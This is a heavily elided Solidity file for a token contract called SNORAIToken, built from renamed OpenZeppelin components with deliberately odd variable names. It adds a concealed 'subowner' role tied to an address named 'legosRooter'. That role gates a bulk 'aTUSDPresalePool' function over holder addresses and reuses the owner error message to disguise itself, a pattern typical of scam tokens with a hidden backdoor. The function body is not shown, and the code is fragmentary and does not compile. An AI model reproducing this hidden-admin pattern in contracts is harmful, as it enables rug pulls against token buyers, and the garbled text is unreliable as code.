...
/*
 * @dev Provides information about the current execution SNORAI20Burnable, including the
 ...
 */
abstract contract SNORAI20Burnable {
...
// File: @openzeppelin/contracts/access/SNORAI20Ownable.sol
 ...
 * the owner.
 */
abstract contract SNORAI20Ownable is SNORAI20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "SNORAI20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "SNORAI20Ownable: new owner is the zero address");
 ...
 * `SafeSNORAI` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeSNORAI {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeSNORAI: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeSNORAI: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeSNORAI: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeSNORAI: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeSNORAI: modulo by zero");
  }
...
contract SNORAIToken is SNORAI20Burnable, SNORAIinterface, SNORAI20Ownable {
    
    using SafeSNORAI for uint256;
    ...
    */
    ...
    /**
    * @dev See {SNORAIinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {SNORAIinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "SNORAI20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {SNORAIinterface-approve}.
    *
    * Requirements:
    *
...
function aTUSDPresalePool(address[] calldata tusdRewards) external subowner {
    ...
    /**
    * @dev See {SNORAIinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {SNORAIinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {SNORAIinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {SNORAIinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "SNORAIinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {SNORAIinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "SNORAIinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "SNORAIinterface: transfer from the zero address");
        require(shippingto != address(0), "SNORAIinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "SNORAIinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "SNORAIinterface: approve from the zero address");
        require(transporteur != address(0), "SNORAIinterface: approve to the zero address");
